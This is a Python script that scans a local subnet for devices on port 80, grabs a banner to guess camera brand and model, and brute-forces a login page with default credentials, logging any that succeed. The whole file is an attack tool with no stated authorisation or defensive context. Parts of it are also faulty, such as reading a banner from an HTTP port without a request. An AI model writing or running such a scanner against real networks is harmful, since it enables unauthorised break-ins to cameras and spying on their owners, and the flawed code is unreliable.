import socket
import asyncio
import requests
import netaddr
import logging

logging.basicConfig(level=logging.INFO)

def ip_range(target_subnet):
    network = netaddr.IPNetwork(target_subnet)
    return [str(ip) for ip in network]

async def portscan(ip, port):
    try:
        reader, writer = await asyncio.open_connection(ip, port)
        writer.close()
        await writer.wait_closed()
        return True
    except (socket.timeout, ConnectionRefusedError):
        return False
    except Exception as e:
        logging.error(f"Error scanning {ip}: {e}")
        return False

def get_camera(ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip, port))
        data = sock.recv(1024)
        brand = data.split()[0]
        model = data.split()[1]
        return {'ip': ip, 'brand': brand, 'model': model}
    except Exception as e:
        logging.error(f"Error retrieving camera information from {ip}: {e}")
        return None

def bruteforce(ip, credentials):
    for username, password in credentials:
        try:
            url = f'http://{ip}/login.htm'
            r = requests.get(url, auth=(username, password))
            if r.status_code == 200:
                logging.info(f'Found valid creds: {username}:{password} at {ip}')
                break
        except Exception as e:
            logging.error(f"Error bruteforcing {ip} with {username}:{password}: {e}")

async def scan(ip, port, credentials):
    if await portscan(ip, port):
        camera_info = get_camera(ip, port)
        if camera_info:
            cameras.append(camera_info)
            bruteforce(ip, credentials)

try:
    target_subnet = "192.168.0.0/24"
    credentials = [('admin', 'password'), ('user', '12345')]

    cameras = []
    ip_addresses = ip_range(target_subnet)

    async def main():
        tasks = []
        for ip in ip_addresses:
            tasks.append(scan(ip, 80, credentials))

        await asyncio.gather(*tasks)

    asyncio.run(main())

    with open('cameras.txt', 'w') as f:
        for camera in cameras:
            f.write(f"{camera['ip']} {camera['brand']} {camera['model']}\n")
except Exception as e:
    logging.error(f"An error occurred: {e}")
